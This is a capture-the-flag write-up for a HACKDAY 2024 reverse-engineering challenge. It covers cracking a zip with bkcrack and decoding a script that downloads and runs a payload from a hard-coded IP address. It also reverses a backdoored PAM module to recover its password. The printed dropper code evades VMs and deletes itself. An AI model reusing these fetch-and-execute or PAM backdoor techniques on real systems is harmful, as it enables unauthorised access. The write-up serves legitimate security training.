---
title: "⚙️ Oh My PAM"
date: 2024-01-22T17:37:46+01:00
tags: ["CTF","Writeups","HACKDAY 2024 Qualification","⚙️ Reverse"]
author: "Sirius14"
showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: false
description: "HACKDAY 2024 Qualification Reverse challenge by Chelinka"
summary:  "HACKDAY 2024 Qualification Reverse challenge by Chelinka"
disableHLJS: false # to disable highlightjs
disableShare: false
hideSummary: false
searchHidden: true
ShowReadingTime: true
ShowBreadCrumbs: false
ShowPostNavLinks: false
ShowWordCount: false
ShowRssButtonInSectionTermList: false
UseHugoToc: true
pygmentsUseClasses: true
pygmentsCodeFences: true
---

At the end of the Baby Web, you got a zip file. Find a way to retrieve its password and follow the steps until you find a password for the backdoor.

## First look

We have a zip file protected by a password, into this file there is 2 file :
- `DS.jpeg`
- `tool_retriever.py`

One good news is that we know what is DS.jpg, indeed at the end of Baby Web challenge we also have DS.jpg file.
In order to crack the zip we need to use [bkcrack](https://github.com/kimci86/bkcrack), with a known plaintext bkcrack can retrieve the key and brute force them to obtain the original password, or use them to create a new password
Our plaintext is not only DS.jpeg because in the zip file, DS.jpeg is compressed. So to have the compressed version we enter this command :

`zip compressed_image.zip DS.jpeg`

Then we can run bkcrack like this : 

`bkcrack -C SuperUltraTech30001.zip -c DS.jpeg -P compressed_image.zip -p DS.jpeg`

And here is the key : `3ea43676 82bd21a5 3f21d103`

With `bkcrack -k 3ea43676 82bd21a5 3f21d103 --bruteforce -r 10..15 ?p` we retrieve the original password : `Super5MDP7768`

P.S : We could replace the password but as you can see later original password is required

## Retreive backdoor

For the next step we can analyze tool_retriver.py

{{<highlight txt>}}
def is_inside_linux():
    return os.name == 'posix'

# Some code ...

def load_p2():
	key = (os.name + getuser() + sys.argv[1]).encode() # Пароль для zip-файла
	address = [47,7,7,29,8,72,64,64,65,98,91,66,84,66,27,124,116,102,25,6,3,12,95,28,7,8,12,27,12,64,7,38,5,21,23,31,84,33,51,49,69,82,24,93,8,10]
	addr = xor(key, address)
	if addr[1:5] == "http":
		r = requests.get(addr[1:]) # Add password or some shit to download it bruh
		with open("/tmp/.a", "wb") as f:
			f.write(r.content)
		subprocess.Popen(["/tmp/.a", detach=True])
	

if __name__ == "__main__":
    load_p2()
    if len(sys.argv) == 2 and is_inside_linux() and not is_inside_docker() and not is_inside_vm() and has_internet_access():
    	print("It works !")
    else:
    	try:
    		subprocess.check_output(['rm','tool_retriever.py','SuperUltraTech30001.zip'])
    	except subprocess.CalledProcessError:
    		pass
{{</highlight>}}

Here are the 3 useful functions, backdoor file is located at a url, and this address is xor with key. We can found this key like this :
- os.name -> `posix` (main condition)
- getuser() -> `root` (load_p2 condition)
- sys.argv[1] -> `Super5MDP7768` (russian commentary)

Key is : `posixrootSuper5MDP7768`
Xoring this key with address tab and we have url:

`http://51.210.106.154/static/r`

## Analysis

This file in bash script with base64 encoded part in which the real backdoor is downloaded, so we recover the real backdoor binary. Let's open IDA to reverse it.
We need to find password which enable this backdoor, and challenge title contains PAM. Thus we search function with name like pam authentication or someting like that.

Bingo, once disassembled we have a function named : `pam_sm_authenticate`

![disassembled function](/Sirius14_Blog/img/writeups/oh-my-pam_1.png)

This part was very interesting, we can understand that pam authentication token is stock into s1 with this line :

`pam_get_authtok(a1,6LL,&s1,0LL)`

Then s1 is compared to `.gnu.version_r`, it seems to be an unusual password but try it.

It is the right password flag is : __HACKDAY{.gnu.version_r}__ 